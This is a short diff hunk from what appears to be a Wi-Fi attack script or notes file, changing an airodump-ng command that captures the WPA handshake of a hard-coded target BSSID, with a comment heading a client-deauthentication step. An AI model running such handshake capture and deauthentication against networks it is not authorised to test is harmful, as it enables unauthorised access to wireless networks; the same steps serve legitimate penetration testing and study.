@@ -18,7 +18,7 @@ rm -fr *.cap && sudo airodump-ng --wps -w wpa wlan1mon -c 6
 tgt=8C:18:50:56:2B:28
 
 # Collect the handshake cap
-sudo rm -fr *.cap && sudo airodump-ng --ivs --bssid ${tgt} -w ${tgt}.cap wlan1mon -c 2
+sudo rm -fr *.cap && sudo airodump-ng --bssid ${tgt} -w ${tgt}.cap wlan1mon -c 2
 
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
 # Deauth the client
